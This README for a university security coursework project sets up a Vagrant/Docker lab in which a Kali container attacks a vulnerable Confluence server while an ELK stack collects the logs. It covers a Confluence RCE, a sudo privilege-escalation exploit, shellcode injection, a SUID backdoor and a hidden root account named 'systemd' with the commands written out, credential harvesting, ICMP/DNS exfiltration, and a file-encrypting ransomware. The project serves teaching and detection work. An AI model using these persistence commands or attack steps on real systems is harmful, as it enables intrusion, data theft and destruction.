# ICT3204 - Coursework Assignment 1

- To plan and implement a attack simulation utilizing `ATT&CK tactics`, `techniques`
- To integrate the usage of `Vagrant Scripts` and `Docker Containers`
- To perform log `collection`, `cleaning` and `visualisation` with the use of the `ELK` stack

## Members
- `2000941` - Ian Peh Shun Wei
- `2001174` - Kevin Pook Yuan Kai
- `2001209` - Lim Jin Tao Benjamin
- `2001267` - Foong Jun Hui
- `2001558` - Jeremy Jevon Chow Zi You
- `2001689` - Cham Zheng Han Donovan

## MITRE ATT&CK Techniques Chosen
- Initial Access - `Exploit Public-Facing Application`
- Privilege Escalation - `Exploit Buffer Overflow`
- Persistence - `Exploit SUID Binary File`
- Credential Access - `Unsecured Credentials`
- Collection & Exfiltration - `Exfiltration via ICMP and DNS`
- Impact - `Ransomware`

## Dependencies
1. `Vagrant` - https://www.vagrantup.com/downloads
2. `Docker Engine` - https://www.docker.com/
3. `Python 3` - https://www.python.org/
4. If using WSL2
   - Create file `.wslconfig` in `C:\Users\user`
   - Edit and add the following line: 
```
[wsl2] 
kernelCommandLine = "sysctl.vm.max_map_count=262144"
```

## Architecture
View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0ba2-476d-b156-56c140aab2bd/edit?viewport_loc=-393%2C-96%2C2219%2C979%2C0_0&invitationId=inv_5979f7e6-9a73-4b7e-b835-07418f9dae9d#)

<img src="https://user-images.githubusercontent.com/1593214/197392810-d5950ac7-472b-47ed-a0f6-2cdf622235cc.png" width="1024">

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

# Usage 
### Table of Contents
  - [Part 1 - Spinning Up The Infrastructure](#part-1---spinning-up-the-infrastructure)
    - [Quick Commands](#quick-commands)
  - [Part 2 - Logs, Dashboards and Services](#part-2---logs-dashboards-and-services)
    - [Confluence - Attack Target](#confluence---attack-target)
    - [Kibana (ELK) Dashboard](#kibana-elk-dashboard)
  - [Part 3 - Attack Vector and Exploits](#part-3---attack-vector-and-exploits)
    - [Automation](#automation)
    - [Initial Access](#initial-access)
      - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
    - [Privilege Escalation](#privilege-escalation)
      - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
      - [K55 Linux Process Injection Utility](#k55-linux-process-injection-utility)
    - [Persistence](#persistence)
      - [Persistence Using SUID Binaries](#persistence-using-suid-binaries)
      - [Persistence Using Account](#persistence-using-account)
    - [Credential Access](#credential-access)
      - [DumpsterDiver](#dumpsterdiver)
      - [LaZagne](#lazagne)
      - [linPEAS](#linpeas)
    - [Exfiltration](#exfiltration)
      - [Exfiltrate Data Over ICMP](#exfiltrate-data-over-icmp)
      - [Exfiltrate Data Over DNS](#exfiltrate-data-over-dns)
    - [Impact](#impact)
      - [Ransomware Payload](#ransomware-payload)

## Part 1 - Spinning Up The Infrastructure
1. Ensure Docker Engine is **running**
2. From within project folder
    ```console
    HOST-MACHINE@HOST $ vagrant up
    ```
    > Expected output 
      ```console
      HOST-MACHINE@HOST $ vagrant up
      Bringing machine 'elk' up with 'docker' provider...
      Bringing machine 'kali' up with 'docker' provider...
      Bringing machine 'postgres' up with 'docker' provider...
      Bringing machine 'confluence' up with 'docker' provider...
      ...
      ...
      ```
      
      ```console
      HOST-MACHINE@HOST $ docker container ls
      CONTAINER ID   IMAGE                           COMMAND                    CREATED           STATUS          PORTS                                                                                                      NAMES
      ...            postgres:14                     "docker-entrypoint.s…"     .. minutes ago    Up xx minutes   0.0.0.0:5432->5432/tcp                                                                                     postgres
      ...            kevinpook/confluence-7.13.0     "/bin/sh -c '/usr/sb…"     .. minutes ago    Up xx minutes   127.0.0.1:2201->22/tcp, 0.0.0.0:80->8090/tcp                                                               confluence
      ...            sebp/elk                        "/usr/local/bin/star…"     .. minutes ago    Up xx minutes   0.0.0.0:5044->5044/tcp, 0.0.0.0:5601->5601/tcp, 0.0.0.0:9200->9200/tcp, 0.0.0.0:9600->9600/tcp, 9300/tcp   elk
      ...            tknerr/baseimage-ubuntu:18.04   "/bin/sh -c '/usr/sb…"     .. minutes ago    Up xx minutes   127.0.0.1:2222->22/tcp                                                                                     kali
      ```

### Quick Commands
```console
# Get the status of the current vagrant machines
HOST-MACHINE@HOST $ vagrant status

# Delete and stop
HOST-MACHINE@HOST $ vagrant destroy

# Stop only
HOST-MACHINE@HOST $ vagrant halt
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

## Part 2 - Logs, Dashboards and Services

### Confluence - Attack Target
- Simulated Network - `10.0.0.3`
- Testing and User Access - [`http://127.0.0.1:80`](http://127.0.0.1:80)

### Kibana (ELK) Dashboard
- Simulated Network - `10.0.0.2`
- User Access - [`http://127.0.0.1:5601`](http://127.0.0.1:5601)
- Browse to [`http://127.0.0.1:5601/app/dashboards`](http://127.0.0.1:5601/app/dashboards) to view the log dashboards. (e.g [Packetbeat] Overview ECS)

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>

## Part 3 - Attack Vector and Exploits
The simulated attacker that is used to perform the relevant [MITRE ATT&CK](https://attack.mitre.org) techniques can be accessed by utilizing the **Attacker/Kali Docker container**
```console
HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
```

### Automation
The process of the attacks can be automated by adding the commands to be executed in the host machine into a bash script. The script is passed into the Vagrantfile with the `run: "never"` parameter, which ensures that it does not run during the normal setup process. To manually activate the individual phases of the attack, run the following command: 

```console
HOST-MACHINE@HOST $ vagrant provision --provision-with <configured attack> 
```
Available configured attacks: `initialaccess` `privesc` `persistence` `credentialaccess` `exfil` `ransom`

### Initial Access
#### CVE-2022-26134 - Confluence RCE
- https://github.com/jbaines-r7/through_the_wire

    <img src="https://user-images.githubusercontent.com/1593214/197329877-ef4c952d-2de8-49e2-84ab-fde8a30edea3.png" width="512">

##### Proof-of-Concept 
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess
==> kali: Running provisioner: initialaccess (shell)...
	...
    kali: confluence@confluence:/opt/atlassian/confluence/bin$ exit
HOST-MACHINE@HOST $
```
##### Reverse Shell Access
```console
HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
root@kali # cd /tmp/1_InitialAccess
root@kali # bash runme.sh
confluence@confluence:/opt/atlassian/confluence/bin $
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Privilege Escalation
#### CVE-2021-3156 - Buffer Overflow Root Shell
https://github.com/CptGibbon/CVE-2021-3156

- Heap-Based Buffer Overflow in Sudo also known as [Baron Samedit](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
- Vulnerability exploitation allows low privileged users to gain root privileges
- Privilege escalation via "sudoedit -s" and a command-line argument that ends with a single backslash character

##### Running CVE-2021-3156 Exploit
```console
root@confluence:/# su confluence
confluence@confluence:/$ cd /vagrant/attack/2_PrivilegeEscalation
confluence@confluence:/vagrant/attack/2_PrivilegeEscalation$ ./demo_1_cve.sh
root@confluence:/tmp/pe/CVE-2021-3156#
```

#### K55 Linux Process Injection Utility
[K55](https://github.com/josh0xA/K55) is a linux payload injection tool that is used for injecting x86_64 shellcode payloads into running processes.

##### Continuing from Exploited Root Shell (Terminal 1)
```console
root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_2_process_injection.sh
root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_2_process_injection.sh
```

##### Running a 2nd Exploited Root Shell (Terminal 2)
```console
root@confluence:/# su confluence
confluence@confluence:/$ cd /tmp/pe/CVE-2021-3156
confluence@confluence:/tmp/pe/CVE-2021-3156$ ./exploit
root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_3_process_injection.sh
root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_3_process_injection.sh
```

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with privesc 
```
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with processinjection
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Persistence
#### Persistence Using SUID Binaries
- After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
- Allows attacker to regain root privileges from low privileged user account.
    
##### Setup
```console
root@confluence:/# cd /tmp
root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
```
```console
root@confluence:/tmp# gcc suid.c -o suid
root@confluence:/tmp# chmod 7111 suid
root@confluence:/tmp# rm suid.c
```
##### Regain
```console
confluence@confluence:/tmp$ ./suid
whoami
root
```

#### Persistence Using Account
- After gaining root access via privilege escalation, create root privileges account.
- Allows attacker to regain root privileges by accessing the account.

```console
root@confluence:/tmp# useradd -ou 0 -g 0 systemd
root@confluence:/tmp# chpasswd <<<"systemd:systemd"
```
##### Regain
```console
confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
confluence@confluence:/tmp$ python /tmp/shell.py
bash: /root/.bashrc: Permission denied
confluence@confluence:/tmp$ su systemd
Password: systemd
# whoami
whoami
root
```

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Credential Access
#### DumpsterDiver
[DumpsterDiver](https://github.com/securing/DumpsterDiver) is a tool that is used to detect any hardcoded secrets like keys or passwords.

#### LaZagne
[LaZagne](https://github.com/AlessandroZ/LaZagne) is an application that is used to retrieve passwords stored on a local computer.

#### linPEAS
[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux. Its functionalities include searching for possible passwords inside all the accessible files of the system.

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with credentialaccess 
```

- Output from the tools used are stored at `/tmp/exfiltrate/credentialAccess`

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Exfiltration
#### Exfiltrate Data Over ICMP
https://github.com/ariary/QueenSono
#### Exfiltrate Data Over DNS
https://github.com/m57/dnsteal

- Collected files are tar-ed from the Confluence server sent to the attacker server via ICMP and DNS
- All files that are to be exfiltrated can be placed at `/tmp/exfiltrate` on the Confluence server
- Files received by the attacker can be found at `/tmp/qs/` (ICMP) and `/tmp/dnsteal/` (DNS)
- Data is exfiltrated to the attacker at X minute intervals (currently set to 1).

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with exfil 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>


### Impact
#### Ransomware Payload
[Python Ransomware Sample](https://infosecwriteups.com/how-to-make-a-ransomware-with-python-c4764f2014cf)

- Run `keygen.py` to generate the `2048-bit` RSA public and private keys used for the encryption process.
- How the ransomware program works:
  - Encryption done in `PKCS#1 OAEP` (`RSAES-OAEP`): Asymmetric cipher based on RSA and OAEP padding.
  - Folders passed in as input to the `cryptic` (ransomware executable) 
  - Folders will be recursively traversed to find files to encrypt.
  - All files found will be encrypted with the public key.
  - All encrypted files will have a new extension `.r4ns0m3`.

#### Automation Script
```console
HOST-MACHINE@HOST $ vagrant provision --provision-with ransom 
```

<p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
